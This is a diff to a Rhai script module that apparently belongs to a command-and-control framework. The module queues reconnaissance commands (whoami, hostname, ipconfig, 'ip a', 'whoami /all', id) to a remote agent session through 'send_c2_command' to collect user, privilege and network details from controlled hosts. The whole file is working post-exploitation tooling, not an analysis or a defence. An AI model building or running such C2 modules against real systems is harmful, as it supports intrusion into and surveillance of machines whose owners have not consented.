@@ -1,14 +1,20 @@
-// This function is imported and executed by the Rust Server
-// 'session_id' is passed from the API URL
+// modules/recon.rhai
+// Basic host reconnaissance. All OS commands require the "shell " prefix
+// so the agent's built-in command dispatcher passes them to the OS shell.
 fn run(session_id) {
     print("Module 'Recon' started for Session: " + session_id);
 
-    // Call the Rust function 'send_c2_command' exposed to this scope
-    // We can chain multiple commands or add logic here
-    
-    let user = send_c2_command(session_id, "whoami");
-    let ip = send_c2_command(session_id, "ipconfig");
+    // Cross-platform: whoami and hostname work on both Linux and Windows
+    send_c2_command(session_id, "shell whoami");
+    send_c2_command(session_id, "shell hostname");
 
-    // Return a JSON-like string to the API response
-    return "Recon executed. Sent commands to queue.";
+    // OS-specific network info — send both; one will succeed
+    send_c2_command(session_id, "shell ipconfig");   // Windows
+    send_c2_command(session_id, "shell ip a");        // Linux
+
+    // OS-specific user/group info
+    send_c2_command(session_id, "shell whoami /all"); // Windows: groups + privs
+    send_c2_command(session_id, "shell id");          // Linux: uid/gid
+
+    return "Recon commands queued for Session " + session_id;
 }
